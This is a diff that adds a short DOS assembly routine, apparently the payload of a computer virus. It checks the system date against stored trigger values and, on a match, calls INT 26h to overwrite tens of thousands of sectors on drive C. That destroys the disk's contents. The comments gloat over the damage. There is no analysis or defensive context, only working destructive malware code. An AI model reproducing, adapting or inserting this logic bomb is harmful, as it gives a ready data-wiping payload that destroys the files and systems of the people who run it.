@@ -1,0 +1,29 @@
+;---------------------------------
+action:                          ; 
+MOV AH,2AH                       ;        
+INT 21H                          ;get date           
+CMP Dl,byte ptr cs:[action_dia+bp]  ;is equal to my day?                 
+JE  cont                         ;nop! fuck ret          
+cmp byte ptr cs:[action_dia+bp],32  ;
+jne no_day                       ;
+cont:                            ; 
+cmp dh,byte ptr cs:[action_mes+bp]  ;is equal to my month?            
+je set                           ;
+cmp byte ptr cs:[action_mes+bp],13  ;
+jne NO_DAY                       ;nop! fuck ret           
+set:                             ; 
+mov ah,0dh                       ;     
+int 21h                          ;reset disk 
+mov al,2                         ;
+mov cx,0ffffh                    ;
+mov dx,0                         ;  
+int 26h                          ;fuck ffffh sector 
+mov ah,0dh                       ;reste disk  
+int 21h                          ;   
+mov al,2                         ;    
+mov cx,0ffffh                    ;    
+mov dx,0ffffh                    ;new fuck+ 
+int 26h                          ;heheheh!!! 
+NO_DAY:                          ;             
+ret                              ;
+;---------------------------------
